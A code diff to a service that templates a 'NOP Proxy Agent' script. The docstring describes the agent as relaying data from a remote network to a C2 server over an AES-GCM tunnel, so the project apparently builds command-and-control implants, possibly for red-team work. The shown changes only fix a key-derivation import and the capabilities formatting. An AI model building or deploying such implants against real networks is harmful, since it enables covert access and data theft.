@@ -132,8 +132,8 @@ class AgentService:
         # Replace {agent_id} placeholder in connection URL  
         server_url = agent.connection_url.replace('{agent_id}', str(agent.id))
         
-        # Pre-compute values that will be used in the template
-        capabilities_json = json.dumps(agent.capabilities, indent=4)
+        # Convert capabilities dict to Python repr (True/False instead of true/false)
+        capabilities_repr = repr(agent.capabilities)
         
         template = f'''#!/usr/bin/env python3
 """
@@ -199,7 +199,7 @@ from datetime import datetime
 from typing import Dict, List, Any
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import base64
 import os
 
@@ -209,7 +209,7 @@ AGENT_NAME = "{agent.name}"
 AUTH_TOKEN = "{agent.auth_token}"
 ENCRYPTION_KEY = "{agent.encryption_key}"
 SERVER_URL = "{server_url}"
-CAPABILITIES = {capabilities_json}
+CAPABILITIES = {capabilities_repr}
 
 class NOPAgent:
     """NOP Proxy Agent - Relays data from remote network to C2 server with encrypted tunnel"""
@@ -227,8 +227,8 @@ class NOPAgent:
     
     def _init_cipher(self):
         """Initialize AES-GCM cipher for encrypted communication"""
-        # Derive encryption key using PBKDF2
-        kdf = PBKDF2(
+        # Derive encryption key using PBKDF2HMAC
+        kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
             salt=b'nop_c2_salt_2026',
